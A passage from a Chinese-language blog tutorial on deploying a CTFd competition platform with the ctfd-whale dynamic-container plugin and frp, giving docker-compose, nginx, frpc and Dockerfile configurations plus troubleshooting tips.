#我将这里注释掉了，这里通过nginx转发感觉速度访问速度会变慢，可能因为我的配置问题，多次尝试之后直接开8000端口访问不会对服务造成影响</span>      <span class="token punctuation">-</span> <span class="token string">"443:443"</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">default</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span>    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ctfd    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>  <span class="token comment">#可改</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 150M     <span class="token comment">#可改</span>  <span class="token key atrule">ctfd</span><span class="token punctuation">:</span>    <span class="token key atrule">build</span><span class="token punctuation">:</span> .    <span class="token key atrule">user</span><span class="token punctuation">:</span> root    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"8000:8000"</span>     <span class="token comment">#这里原本没开端口，直接打开访问网站速度会加快</span>    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> UPLOAD_FOLDER=/var/uploads      <span class="token punctuation">-</span> DATABASE_URL=mysql+pymysql<span class="token punctuation">:</span>//root<span class="token punctuation">:</span>ctfd@db/ctfd      <span class="token punctuation">-</span> REDIS_URL=redis<span class="token punctuation">:</span>//cache<span class="token punctuation">:</span><span class="token number">6379</span>      <span class="token punctuation">-</span> WORKERS=1      <span class="token punctuation">-</span> LOG_FOLDER=/var/log/CTFd      <span class="token punctuation">-</span> ACCESS_LOG=<span class="token punctuation">-</span>      <span class="token punctuation">-</span> ERROR_LOG=<span class="token punctuation">-</span>      <span class="token punctuation">-</span> REVERSE_PROXY=true    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> .data/CTFd/logs<span class="token punctuation">:</span>/var/log/CTFd      <span class="token punctuation">-</span> .data/CTFd/uploads<span class="token punctuation">:</span>/var/uploads      <span class="token punctuation">-</span> .<span class="token punctuation">:</span>/opt/CTFd<span class="token punctuation">:</span>ro      <span class="token punctuation">-</span> /var/run/docker.sock<span class="token punctuation">:</span>/var/run/docker.sock     <span class="token comment">#这里是添加的</span>    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> db    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">default</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span>        <span class="token key atrule">frp</span><span class="token punctuation">:</span>            <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 172.1.0.2    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>     <span class="token comment">#可改</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 450M     <span class="token comment">#可改</span>  <span class="token key atrule">db</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> mariadb<span class="token punctuation">:</span><span class="token number">10.4</span>    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> MYSQL_ROOT_PASSWORD=ctfd      <span class="token punctuation">-</span> MYSQL_USER=ctfd      <span class="token punctuation">-</span> MYSQL_PASSWORD=ctfd    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> .data/mysql<span class="token punctuation">:</span>/var/lib/mysql    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span>    <span class="token comment"># This command is required to set important mariadb defaults</span>    <span class="token key atrule">command</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>mysqld<span class="token punctuation">,</span> <span class="token punctuation">-</span><span class="token punctuation">-</span>character<span class="token punctuation">-</span>set<span class="token punctuation">-</span>server=utf8mb4<span class="token punctuation">,</span> <span class="token punctuation">-</span><span class="token punctuation">-</span>collation<span class="token punctuation">-</span>server=utf8mb4_unicode_ci<span class="token punctuation">,</span> <span class="token punctuation">-</span><span class="token punctuation">-</span>wait_timeout=28800<span class="token punctuation">,</span> <span class="token punctuation">-</span><span class="token punctuation">-</span>log<span class="token punctuation">-</span>warnings=0<span class="token punctuation">]</span>    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>     <span class="token comment">#可改</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 750M     <span class="token comment">#可改</span>  <span class="token key atrule">cache</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> redis<span class="token punctuation">:</span><span class="token number">4</span>    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> .data/redis<span class="token punctuation">:</span>/data    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span>    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>     <span class="token comment">#可改</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 450M     <span class="token comment">#可改</span>  <span class="token key atrule">frpc</span><span class="token punctuation">:</span>        <span class="token key atrule">image</span><span class="token punctuation">:</span> glzjin/frp<span class="token punctuation">:</span>latest     <span class="token comment">#赵师傅tql</span>    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./frpc<span class="token punctuation">:</span>/conf/     <span class="token comment">#这里注意</span>    <span class="token key atrule">entrypoint</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> /usr/local/bin/frpc        <span class="token punctuation">-</span> <span class="token punctuation">-</span>c        <span class="token punctuation">-</span> /conf/frpc.ini    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">frp</span><span class="token punctuation">:</span>            <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 172.1.0.3  <span class="token comment">#记住此处</span>        <span class="token key atrule">frp-containers</span><span class="token punctuation">:</span>    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>     <span class="token comment">#可改</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 250M     <span class="token comment">#可改</span><span class="token key atrule">networks</span><span class="token punctuation">:</span>    <span class="token key atrule">default</span><span class="token punctuation">:</span>    <span class="token key atrule">internal</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>    <span class="token key atrule">frp</span><span class="token punctuation">:</span>        <span class="token key atrule">driver</span><span class="token punctuation">:</span> bridge        <span class="token key atrule">ipam</span><span class="token punctuation">:</span>            <span class="token key atrule">config</span><span class="token punctuation">:</span>                <span class="token punctuation">-</span> <span class="token key atrule">subnet</span><span class="token punctuation">:</span> 172.1.0.0/16    <span class="token key atrule">frp-containers</span><span class="token punctuation">:</span>        <span class="token key atrule">driver</span><span class="token punctuation">:</span> overlay        <span class="token key atrule">internal</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">ipam</span><span class="token punctuation">:</span>            <span class="token key atrule">config</span><span class="token punctuation">:</span>                <span class="token punctuation">-</span> <span class="token key atrule">subnet</span><span class="token punctuation">:</span> 172.2.0.0/16</code></pre><p>然后<strong>注意！注意！注意！</strong></p><p>在docker-compose.yml同目录下建nginx文件夹，即与第一个#这里注意相应，然后建<code>http.conf</code>文件写入以下内容</p><p><strong>2021年2月25日更新</strong>目前最新版本的CTFd已经有此配置了，不需要再另加了。</p><p>转载请注明来源：<a href="https://err0r.top/article/CTFD/">https://err0r.top/article/CTFD/</a></p><pre class="language-none"><code class="language-none">worker_processes 4;events &#123;  worker_connections 1024;&#125;http &#123;  # Configuration containing list of application servers  upstream app_servers &#123;    server ctfd:8000;  &#125;  server &#123;    listen 80;    client_max_body_size 4G;    # Handle Server Sent Events for Notifications    location &#x2F;events &#123;      proxy_pass http:&#x2F;&#x2F;app_servers;      proxy_set_header Connection &#39;&#39;;      proxy_http_version 1.1;      chunked_transfer_encoding off;      proxy_buffering off;      proxy_cache off;      proxy_redirect off;      proxy_set_header Host $host;      proxy_set_header X-Real-IP $remote_addr;      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;      proxy_set_header X-Forwarded-Host $server_name;    &#125;    # Proxy connections to the application servers    location &#x2F; &#123;      proxy_pass http:&#x2F;&#x2F;app_servers;      proxy_redirect off;      proxy_set_header Host $host;      proxy_set_header X-Real-IP $remote_addr;      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;      proxy_set_header X-Forwarded-Host $server_name;    &#125;  &#125;&#125;</code></pre><p>在docker-compose.yml同目录下建frpc文件夹，即与第二个#这里注意相应，然后进入解压的&#x2F;frp_0.29.0_linux_amd64文件夹，或直接上传，将</p><pre class="language-none"><code class="language-none">frpcfrpc.inifrpc_full.iniLICENSE</code></pre><p>放入frpc文件夹<br>接着配置frpc.ini，直接上配置</p><pre class="language-none"><code class="language-none">[common]token &#x3D; randommeserver_addr &#x3D; 172.1.0.4server_port &#x3D; 6490     #此处必须与frpc.ini配置一致pool_count &#x3D; 200tls_enable &#x3D; trueadmin_addr &#x3D; 172.1.0.3 #一定要加！！与后面相应admin_port &#x3D; 7400</code></pre><p>此处非常重要，之前本人在这里踩了好多次坑。</p><h3 id="5-配置Dockerfile"><a href="#5-配置Dockerfile" class="headerlink" title="5.配置Dockerfile"></a>5.配置Dockerfile</h3><p>还是直接上配置，<strong>Dockerfile</strong>.注意，最新版本的CTFd已经更换了Dockerfile的写法，可以参考一下apt换源</p><pre class="language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> python:3.7-alpine  #如果出现问题可尝试更换python，一般不需要</span><span class="token instruction"><span class="token keyword">RUN</span> sed -i <span class="token string">'s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g'</span> /etc/apk/repositories &amp;&amp; <span class="token operator">\</span>    apk update &amp;&amp; <span class="token operator">\</span>    apk add linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-dev   #这里注意1</span><span class="token instruction"><span class="token keyword">RUN</span> adduser -D -u 1001 -s /bin/bash ctfd</span><span class="token instruction"><span class="token keyword">WORKDIR</span> /opt/CTFd</span><span class="token instruction"><span class="token keyword">RUN</span> mkdir -p /opt/CTFd /var/log/CTFd /var/uploads</span><span class="token instruction"><span class="token keyword">COPY</span> requirements.txt .</span><span class="token instruction"><span class="token keyword">RUN</span> pip install -r requirements.txt -i https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple/   #这里注意2</span><span class="token instruction"><span class="token keyword">COPY</span> . /opt/CTFd</span><span class="token instruction"><span class="token keyword">RUN</span> for d in CTFd/plugins/*; do <span class="token operator">\</span>      if [ -f <span class="token string">"$d/requirements.txt"</span> ]; then <span class="token operator">\</span>        pip install -r <span class="token variable">$d</span>/requirements.txt -i https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple/ ; <span class="token operator">\</span>      fi; <span class="token operator">\</span>    done; #同样注意2</span><span class="token instruction"><span class="token keyword">RUN</span> chmod +x /opt/CTFd/docker-entrypoint.sh</span><span class="token instruction"><span class="token keyword">RUN</span> chown -R 1001:1001 /opt/CTFd</span><span class="token instruction"><span class="token keyword">RUN</span> chown -R 1001:1001 /var/log/CTFd /var/uploads</span><span class="token instruction"><span class="token keyword">USER</span> 1001</span><span class="token instruction"><span class="token keyword">EXPOSE</span> 8000</span><span class="token instruction"><span class="token keyword">ENTRYPOINT</span> [<span class="token string">"/opt/CTFd/docker-entrypoint.sh"</span>]</span></code></pre><p>注意点：</p><ol><li>第一处的镜像源可百度更换其它源，例如</li></ol><p><code>sed -i &#39;s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g&#39; /etc/apk/repositories</code><br>注意如果出现问题检查下最后有没有<code>&amp;&amp; \</code></p><ol start="2"><li>python版本一般不需要换</li><li>RUN第三行我将python和python-dev删掉了，如果要加上则会报错<code>python requires by world</code>之类的，请加上<code>python2</code>或<code>python3</code>，<code>python2-dev</code>或<code>python3-dev</code>.即可解决。删掉后没有发现对服务有什么影响</li><li>所有<code>-i &quot;url&quot;</code>都是指定源，如果下载失败则可更换源再试</li><li>第二处注意即我更换了源，因为之前看其他教程下载失败了</li></ol><h3 id="6-准备完毕"><a href="#6-准备完毕" class="headerlink" title="6.准备完毕"></a>6.准备完毕</h3><p>运行<code>docker-compose build</code><br>静待完成</p><img src="/article/CTFD/20201017233234439.png" class="" title="build" loading="lazy"><p>然后运行<code>docker-compose up -d</code></p><img src="/article/CTFD/20201017233300241.png" class="" title="up" loading="lazy"><p>如图所示，有WARNING即为在集群网络类，是正常情况<br>运行<code>docker ps</code>查看容器情况</p><img src="/article/CTFD/20201017233329640.png" class="" title="ps" loading="lazy"><p>访问 <a href="http://ip:8000/">http://ip:8000</a> 即可访问ctfd</p><h3 id="配置CTFD"><a href="#配置CTFD" class="headerlink" title="配置CTFD"></a>配置CTFD</h3><p>进入后随便设置，然后进Admin Panel进行设置</p><table><thead><tr><th>属性</th><th>配置</th></tr></thead><tbody><tr><td>Docker API URL</td><td>unix:&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock</td></tr><tr><td>Frp API IP</td><td>frpc的ip配置</td></tr><tr><td>Frp API Port</td><td>frpc的端口配置</td></tr><tr><td>Frp Http Domain Suffix</td><td>Docker API URL to connect（可填None）</td></tr><tr><td>Frp Http Port</td><td>80</td></tr><tr><td>Frp Direct IP Address</td><td>你的公网ip，本机即为127.0.0.1</td></tr><tr><td>Frp Direct Minimum Port</td><td>与之前frps最小端口呼应</td></tr><tr><td>Frp Direct Minimum Port</td><td>与之前frps最大端口呼应</td></tr><tr><td>Max Container Count</td><td>不超过最大-最小</td></tr><tr><td>Max Renewal Times</td><td>最大实例延时次数</td></tr><tr><td>Frp config template</td><td>填入frps的配置，只需填[common]</td></tr><tr><td>Docker Auto Connect Containers</td><td>ctfd_frpc_1</td></tr><tr><td>Docker Dns Setting</td><td>可填机器内DNS，没有可填个外网DNS</td></tr><tr><td>Docker Swarm Nodes</td><td>linux-1   与前面swarm集群呼应</td></tr><tr><td>Docker Multi-Container Network Subnet</td><td>内网题大子网ip配置&#x2F;CIDR</td></tr><tr><td>Docker Multi-Container Network Subnet New Prefix</td><td>每个内网题实例的CIDR</td></tr><tr><td>Docker Container Timeout</td><td>单位为秒</td></tr></tbody></table><p>最后附上我的配置图片</p><img src="/article/CTFD/20201017233350699.png" class="" title="配置1" loading="lazy"><img src="/article/CTFD/20201017233413853.png" class="" title="配置2" loading="lazy"><img src="/article/CTFD/20201017233431163.png" class="" title="配置3" loading="lazy"><h3 id="设置docker网络"><a href="#设置docker网络" class="headerlink" title="设置docker网络"></a>设置docker网络</h3><p>这个时候运行<code>docker ps</code><br>发现frpc在无限重启，因为我们还没有配置网络<br>运行<code>docker network ls</code></p><img src="/article/CTFD/20201017234359215.png" class="" title="容器" loading="lazy"><p>显示ctfd_frp-containers</p><p>运行<code>docker network inspect ctfd_frp</code></p><img src="/article/CTFD/20201017234428683.png" class="" title="ctfd_frp" loading="lazy"><p>这个是docker-compose里compose后创建的网络，我们将frps加入此网络，例如我的frp容器id为12345，则运行<code>docker network connect ctfd_frp 12345&lt;即frp容器id&gt;</code>。再运行<code>docker network inspect ctfd_frp</code>，如下<img src="/article/CTFD/20201017234344822.png" class="" title="在这里插入图片描述" loading="lazy"></p><p>这里可以看到ip与我们之前设置的相应。</p><p>此时运行<code>docker restart ctfd_frpc_1 frp_frps_1</code></p><p>然后<code>docker ps</code></p><p>最终如下<img src="/article/CTFD/20201017234457228.png" class="" title="ps" loading="lazy"></p><p>成功完成。</p><p>最后设置道题目选择（我做了汉化）</p><img src="/article/CTFD/20201017233701655.png" class="" title="题目1" loading="lazy"><img src="/article/CTFD/20201017233922648.png" class="" title="题目2" loading="lazy"><img src="/article/CTFD/20201017234241273.png" class="" title="在这里插入图片描述" loading="lazy"><p><code>docker ps</code>里可以看到容器成功启动，地址正常访问</p><h3 id="坑点注意"><a href="#坑点注意" class="headerlink" title="坑点注意"></a>坑点注意</h3><ol><li>如果frpc重复出现retrying，请返回检查docker-compose.yml。找到frpc设置，检查ip设置是否正确。再检查ctfd的Admin Panel里ctfd-whale设置是否正确。</li><li>如果出现安装某个文件失败问题，请更换源，很多都是源里没有指定文件造成的。可以自行访问一下网站，查看一下要下载的文件名，再进行配置。</li><li>似乎docker和系统的版本会有影响，本机为CentOS7.4 64位，腾讯云，docker配置如下</li></ol><img src="/article/CTFD/20201017234315447.png" class="" title="版本" loading="lazy"><ol start="4"><li><p>python的问题，上面提到的，可以删除，是因为没有指定版本的原因，也可以指定版本再下载</p></li><li><p>ctfd运行<code>docker-compose up -d</code>后有可能提示docker-entrypoint.sh没有权限，手动加个权限即可。在CTFd文件夹下运行<code>chmod a+x docker-entrypoint.sh</code>（docker-compose.yml里其实写了加权限，但是最后并没有加上去？）</p></li><li><p>如果docker容器无法启动或者frp端口无法映射可以进容器检查 </p><p>确保docker api填写正确，如docker-compose.yml中写的unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock<br>你也可以使用端口形式的api如<a href="https://success.docker.com/article/how-do-i-enable-the-remote-api-for-dockerd">官方示例</a>：可以用IP：端口指定API</p><h6 id="docker容器无法启动问题"><a href="#docker容器无法启动问题" class="headerlink" title="docker容器无法启动问题"></a>docker容器无法启动问题</h6><p>进入容器检查：</p><pre class="language-none"><code class="language-none">docker exec -it &lt;ctfd容器id&gt; sh&#x2F;opt&#x2F;CTFd# python&gt;&gt;&gt;import docker&gt;&gt;&gt;client&#x3D;docker.DockerClient(base_url&#x3D;&quot;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock&quot;)&gt;&gt;&gt;client.images.list()</code></pre><p> 如果api正确会列出所有镜像 </p><h6 id="frp端口无法映射问题"><a href="#frp端口无法映射问题" class="headerlink" title="frp端口无法映射问题"></a>frp端口无法映射问题</h6><p>进入容器检查：</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;其实检查可以顺便检查一下上面的，因为都在ctfd容器内docker exec -it &lt;ctfd容器id&gt; sh&#x2F;opt&#x2F;CTFd# python&gt;&gt;&gt;import requests&gt;&gt;&gt;requests.get(&quot;http:&#x2F;&#x2F;172.1.0.3:7400&#x2F;api&#x2F;reload&quot;)&#x2F;&#x2F;即frp api的地址返回&lt;Response [200]&gt; #表示成功</code></pre><p>如果frpc还是出现如下问题</p><pre class="language-none"><code class="language-none">requests.exceptions.ConnectionError: HTTPConnectionPool(host&#x3D;&#39;172.1.0.3&#39;, port&#x3D;7400): Max retries exceeded with url: &#x2F;api&#x2F;reload (Caused by NewConnectionError(&#39;&lt;urllib3.connection.HTTPConnection object at 0x7f8df919f850&gt;: Failed to establish a new connection: [Errno 111] Connection refused&#39;))</code></pre><p>则重新配置frpc。编辑&#x2F;CTFd&#x2F;frpc&#x2F;frpc.ini</p><pre class="language-none"><code class="language-none">[common]token &#x3D; randommeserver_addr &#x3D; 172.1.0.4server_port &#x3D; 6490pool_count &#x3D; 200tls_enable &#x3D; trueadmin_addr &#x3D; 172.1.0.3 #这里千万千万别忘加，之前要被搞气死admin_port &#x3D; 7400</code></pre><p>然后运行<code>docker restart ctfd_frpc_1</code>（这里再看frpc.ini会发现内容更新了，admin配置没了，不用担心）</p><p>再进容器检查<code>requests.get(&quot;http://172.1.0.3:7400/api/reload&quot;)</code>应该就可以了<code>&lt;Response [200]&gt;</code></p></li><li><p>遇事不决请重启</p></li><li><p>如果发现frp端口冲突，请检查本地frpc或者frps服务，frp是在docker上<strong>不是在本地</strong>的！</p><pre class="language-none"><code class="language-none">systemctl stop frpcsystemctl stop frps</code></pre></li><li><p>活用查看log</p><pre class="language-none"><code class="language-none">docker logs &lt;ctfd容器id&gt;docker logs &lt;frp容器id&gt;</code></pre></li><li><p>如果修改了任意配置，请跟着修改<strong>系列配置</strong>，很多就是因为漏改造成的</p></li></ol><p>11.docker ps显示正常但是无法访问</p><p> 可以使用 <code>docker logs ctfd_ctfd_1</code> 查看输出，如果发现输出类似： </p><pre class="language-none"><code class="language-none">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;tzlocal&#x2F;unix.py:158: UserWarning: Can not find any timezone configuration, defaulting to UTC.  warnings.warn(&#39;Can not find any timezone configuration, defaulting to UTC.&#39;)Starting CTFd&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject  return f(*args, **kwds)&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject  return f(*args, **kwds)&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject  return f(*args, **kwds)[2020-10-11 12:31:30 +0000] [1] [INFO] Starting gunicorn 19.9.0[2020-10-11 12:31:30 +0000] [1] [INFO] Listening at: http:&#x2F;&#x2F;0.0.0.0:8000 (1)[2020-10-11 12:31:30 +0000] [1] [INFO] Using worker: gevent[2020-10-11 12:31:30 +0000] [21] [INFO] Booting worker with pid: 21[2020-10-11 12:31:31 +0000] [23] [INFO] Booting worker with pid: 23[2020-10-11 12:31:32 +0000] [25] [INFO] Booting worker with pid: 25[2020-10-11 12:31:34 +0000] [27] [INFO] Booting worker with pid: 27[2020-10-11 12:31:35 +0000] [29] [INFO] Booting worker with pid: 29[2020-10-11 12:31:36 +0000] [31] [INFO] Booting worker with pid: 31[2020-10-11 12:31:37 +0000] [33] [INFO] Booting worker with pid: 33[2020-10-11 12:31:39 +0000] [35] [INFO] Booting worker with pid: 35[2020-10-11 12:31:40 +0000] [37] [INFO] Booting worker with pid: 37(一直在加)</code></pre><p> 则问题为<a href="https://stackoverflow.com/questions/64105616/greenlet-runtime-error-and-deployed-app-in-docker-keeps-booting-all-the-workers">这篇文章中所提到的问题</a>，只需要删除 <code>requirements.txt</code> 中的 <code>gevent</code> 版本号即可，结果类似下面这样 </p><pre class="language-none"><code class="language-none">&#x2F;requirements.txt...redis&#x3D;&#x3D;3.3.11datafreeze&#x3D;&#x3D;0.1.0geventpython-dotenv&#x3D;&#x3D;0.10.3flask-restplus&#x3D;&#x3D;0.13.0...</code></pre><p> 然后 <code>docker-compose down</code> 再启动 <code>docker-compose up -d --build</code> 不出意外应该就能解决问题 </p><p>(更新)12.出现如下问题可参考<a href="https://github.com/glzjin/CTFd-Whale/issues/20">此issue</a>提出的问题，在ctfd的docker-compose.yml添加<code>/var/run/docker.sock:/var/run/docker.sock</code></p><img src="/article/CTFD/99216164-ee25b080-280f-11eb-95a9-2c2a17895068.png" class="" title="image" loading="lazy"><p>如下</p><img src="/article/CTFD/image-20210225153426310.png" class="" title="image-20210225153426310" loading="lazy"><h2 id="2021-2-25-更新"><a href="#2021-2-25-更新" class="headerlink" title="2021.2.25 更新"></a>2021.2.25 更新</h2><p>最新的CTFd改了部分代码，由于兼容性问题，需要重新编辑一些东西，例如<code>Dockerfile</code></p><pre class="language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> python:3.7-slim-buster</span><span class="token instruction"><span class="token keyword">WORKDIR</span> /opt/CTFd</span><span class="token instruction"><span class="token keyword">RUN</span> mkdir -p /opt/CTFd /var/log/CTFd /var/uploads</span><span class="token comment"># hadolint ignore=DL3008</span><span class="token instruction"><span class="token keyword">RUN</span> echo <span class="token string">'deb http://mirrors.aliyun.com/debian/ buster main non-free contrib \ deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \ deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \ deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib \ deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \ deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \ deb http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib \ deb-src http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib'</span>> /etc/apt/sources.list &amp;&amp; <span class="token operator">\</span>    apt-get update <span class="token operator">\</span>    &amp;&amp; apt-get install -y --no-install-recommends <span class="token operator">\</span>        build-essential <span class="token operator">\</span>        default-mysql-client <span class="token operator">\</span>        python3-dev <span class="token operator">\</span>        libffi-dev <span class="token operator">\</span>        libssl-dev <span class="token operator">\</span>        git <span class="token operator">\</span>    &amp;&amp; apt-get clean <span class="token operator">\</span>    &amp;&amp; rm -rf /var/lib/apt/lists/*</span><span class="token instruction"><span class="token keyword">COPY</span> requirements.txt /opt/CTFd/</span><span class="token instruction"><span class="token keyword">RUN</span> pip install -r requirements.txt -i http://mirrors.aliyun.com/pypi/simple/ --no-cache-dir</span><span class="token instruction"><span class="token keyword">COPY</span> . /opt/CTFd</span><span class="token comment"># hadolint ignore=SC2086</span><span class="token instruction"><span class="token keyword">RUN</span> for d in CTFd/plugins/*; do <span class="token operator">\</span>        if [ -f <span class="token string">"$d/requirements.txt"</span> ]; then <span class="token operator">\</span>            pip install -r <span class="token variable">$d</span>/requirements.txt -i http://mirrors.aliyun.com/pypi/simple/ --no-cache-dir; <span class="token operator">\</span>        fi; <span class="token operator">\</span>    done;</span><span class="token instruction"><span class="token keyword">RUN</span> adduser <span class="token operator">\</span>    --disabled-login <span class="token operator">\</span>    -u 1001 <span class="token operator">\</span>    --gecos <span class="token string">""</span> <span class="token operator">\</span>    --shell /bin/bash <span class="token operator">\</span>    ctfd</span><span class="token instruction"><span class="token keyword">RUN</span> chmod +x /opt/CTFd/docker-entrypoint.sh <span class="token operator">\</span>    &amp;&amp; chown -R 1001:1001 /opt/CTFd /var/log/CTFd /var/uploads</span><span class="token instruction"><span class="token keyword">USER</span> 1001</span><span class="token instruction"><span class="token keyword">EXPOSE</span> 8000</span><span class="token instruction"><span class="token keyword">ENTRYPOINT</span> [<span class="token string">"/opt/CTFd/docker-entrypoint.sh"</span>]</span></code></pre><p>其他pip源</p><pre class="language-none"><code class="language-none">清华：https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;中国科技大学 https:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;华中理工大学：http:&#x2F;&#x2F;pypi.hustunique.com&#x2F;山东理工大学：http:&#x2F;&#x2F;pypi.sdutlinux.org&#x2F;豆瓣：http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple&#x2F;</code></pre><img src="/article/CTFD/image-20210225163134408.png" class="" title="image-20210225163134408" loading="lazy"><img src="/article/CTFD/image-20210225163821673.png" class="" title="image-20210225163821673" loading="lazy"><p><strong>我整合了一下CTFd+ctfd-whale+frpc+frps，可以参考一下，<a href="https://github.com/Err0rCM/CTFd_with_CTFd-whale">已上传github</a></strong></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p> <a href="https://www.zhaoj.in/read-6333.html">CTFd-Whale 推荐部署实践</a>(赵师傅官方)</p><p><a href="https://blog.csdn.net/fjh1997/article/details/100850756/">手把手教你如何建立一个支持ctf动态独立靶机的靶场（ctfd+ctfd-whale）</a></p><p> <a href="https://vaala.cat/2020/09/21/ctfd%E4%BD%BF%E7%94%A8ctfd-whale%E5%8A%A8%E6%80%81%E9%9D%B6%E6%9C%BA%E6%8F%92%E4%BB%B6%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA%E6%8C%87%E5%8D%97/">ctfd使用ctfd-whale动态靶机插件搭建靶场指南</a></p><p>转载请注明来源：<a href="https://err0r.top/article/CTFD/">https://err0r.top/article/CTFD/</a></p><p>如果有问题请私信联系我，不足之处敬请谅解</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 菜鸡教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0XGame WEB Write-up</title>
      <link href="article/0XGame-WEB-Write-up/"/>
      <url>article/0XGame-WEB-Write-up/</url>
      
